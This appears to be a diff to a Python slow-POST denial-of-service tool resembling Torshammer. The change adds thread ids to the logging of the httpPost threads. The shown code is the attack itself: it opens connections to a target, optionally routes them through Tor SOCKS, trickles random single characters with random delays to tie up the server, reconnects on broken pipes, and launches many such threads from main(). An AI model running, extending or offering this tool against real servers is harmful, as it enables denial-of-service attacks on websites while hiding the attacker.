@@ -50,8 +50,9 @@ useragents = [
 
 
 class httpPost(Thread):
-    def __init__(self, host, port, tor, sockshost, socksport, maxsecondsbeetweenpacket):
+    def __init__(self, threadid, host, port, tor, sockshost, socksport, maxsecondsbeetweenpacket):
         Thread.__init__(self)
+        self.threadid = threadid
         self.host = host
         self.port = port
         self.socks = socks.socksocket()
@@ -78,7 +79,7 @@ class httpPost(Thread):
                 self.running = False
                 break
             p = random.choice(string.ascii_letters+string.digits)
-            print(term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL)
+            print(term.BOL+term.UP+term.CLEAR_EOL+"[%d]: Posting: %s" % (self.threadid, p+term.NORMAL))
             self.socks.send(p)
             time.sleep(random.uniform(0.1, maxsecondsbeetweenpacket))
 
@@ -96,11 +97,11 @@ class httpPost(Thread):
 
                     self.socks.connect((self.host, self.port))
                     # print(term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL)
-                    print("Connected to host...\n")
+                    print("[%d]: Connected to host...\n" % self.threadid)
                     break
                 except Exception as e:
                     # print(term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL)
-                    print("Error connecting to host...\n")
+                    print("[%d]: Error connecting to host...\n" % self.threadid)
                     print(e)
                     time.sleep(1)
                     sys.exit()
@@ -111,7 +112,7 @@ class httpPost(Thread):
                 except Exception as e:
                     if e.args[0] == 32 or e.args[0] == 104:
                         # print(term.BOL + term.UP + term.CLEAR_EOL + "Thread broken, restarting..." + term.NORMAL)
-                        print("Thread broken, restarting...\n")
+                        print("[%d]: Thread broken, restarting...\n" % self.threadid)
                         self.socks = socks.socksocket()
                         break
                     time.sleep(0.1)
@@ -186,7 +187,7 @@ def main(argv):
 
     rthreads = []
     for i in range(threads):
-        t = httpPost(target, port, tor, sockshost, socksport, maxsecondsbeetweenpacket)
+        t = httpPost(i, target, port, tor, sockshost, socksport, maxsecondsbeetweenpacket)
         rthreads.append(t)
         t.start()
         if presleepbeetweenthreadstart:
